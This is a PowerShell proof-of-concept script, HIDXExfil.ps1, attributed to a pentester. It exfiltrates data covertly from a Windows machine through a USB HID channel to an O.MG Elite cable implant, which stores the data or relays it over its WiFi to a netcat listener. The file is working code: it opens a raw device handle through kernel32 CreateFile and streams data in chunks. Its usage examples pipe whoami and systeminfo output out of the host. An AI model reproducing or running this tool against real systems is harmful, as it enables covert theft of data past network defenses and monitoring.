<#

HIDXExfil.ps1
Author: [REDACTED] (@01p8or13)
Acknowledgements: spiceywasabi, rogandawes
Required Dependencies: Activated HIDX on OMG Elite device

#>

function HIDXExfil {
<#
.DESCRIPTION
A “low and slow” method of covert exfiltration meant to provide alternate 
pentesting pathways beyond using the target host’s network interfaces or 
mass storage.
This POC will allow data exfiltration back to the O.MG’s flash storage or
act as a proxy between the target host and another device via the O.MG
Device's built in WiFi interface which can allow you to recieve listeners 
via nc, netcat, or similar tools.

.PARAMETER Message
Message which gets exfiltrated.

.PARAMETER VendorID
Defining vendor ID of the device. (Default: D3C0)

.PARAMETER ProductID
Defining product ID of the device. (Default: D34D)

.EXAMPLE
Defining a message: 
HIDXpoc -Message "hello world"

.EXAMPLE
HIDX usage with every paramter: 
HIDXpoc -VendorID D3C0 -ProductID D34D -Message "test"

.EXAMPLE
Piping output into HIDX: 
whoami | HIDXpoc

.EXAMPLE
Exfiltrating systeminfo with proper formatting:
systeminfo | Out-String | HIDXpoc

.LINK
https://github.com/0iphor13
https://github.com/spiceywasabi
https://github.com/rogandawes

#Credits to Rogan for idea of filehandle and device identification
#>

# Message to exfiltrate
[cmdletbinding()]
param(
    [Parameter(
        Mandatory = $true,
        ValueFromPipeline = $true)]
        $Message,

    [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $VendorID = "D3C0", #Default value

    [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ProductID = "D34D" # Default value
        )

    # Defining OMG device
    $OMG = $VendorID +"&PID_" + $ProductID

# Open filehandle to device
$cs =@"
    using System;
    using System.IO;
    using Microsoft.Win32.SafeHandles;
    using System.Runtime.InteropServices;
    namespace omg {
        public class hidx {
            [DllImport("kernel32.dll", CharSet = CharSet.Auto, 
SetLastError = true)]
            public static extern SafeFileHandle CreateFile(String fn, 
UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
            public static FileStream open(string fn) {
                return new FileStream(CreateFile(fn, 0XC0000000U, 3, 
IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
            }
        }
    }
"@
    Add-Type -TypeDefinition $cs

    # Identify OMG device
    $devs = gwmi Win32_USBControllerDevice
        foreach ($dev in $devs) {
            $wmidev = [wmi]$dev.Dependent
            if ($wmidev.GetPropertyValue('DeviceID') -match ($OMG) -and 
($wmidev.GetPropertyValue('Service') -eq $null)) {
                $devicestring = ([char]92+[char]92+'?'+[char]92 + 
$wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) 
+ [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
            }
        }

    if ($devicestring -eq $NULL) {
        Write-Host -ForegroundColor red "[!]Error: Could not find OMG 
device - Check VID/PID"
        return
    }

    $filehandle = [omg.hidx]::open($devicestring)
    if($filehandle -eq $NULL){
        Write-Host -ForegroundColor red "[!]Error: Filehandle is empty"
        return
    }

    # Take message and convert it to bytes
    $payload = [System.Text.Encoding]::UTF8.GetBytes($Message+"`n")
    $payloadLength = $payload.Length

    # Define size of chunks - With 1 basically every string length works
    $chunksize = 1

    # Calculate number of chunks
    $chunkNr = [Math]::Ceiling($payloadLength / $chunksize)

    # Send bytes to omg
    $bytes = New-Object Byte[] (65)
    # Write an initial blank packet to start the comms
    $filehandle.Write($bytes,0,65)

    # Loop through chunks and send them to OMG device
    for ($i = 0; $i -lt $chunkNr; $i++) {
        $start = $i * $chunksize
        $end = [Math]::Min(($i + 1) * $chunksize, $payloadLength)
        $chunkLen = $end - $start
        $payloadChunk = New-Object Byte[] $chunkLen
        [System.Buffer]::BlockCopy($payload, $start, $payloadChunk, 0, 
$chunkLen) #Copy the payload to the chunk
        $bytes[1] = $chunkLen
        [System.Buffer]::BlockCopy($payloadChunk, 0, $bytes, 2, $chunkLen) 
#Copy the chunk to the packet
        $filehandle.Write($bytes, 0, 65)
    }


    $filehandle.Close()
}

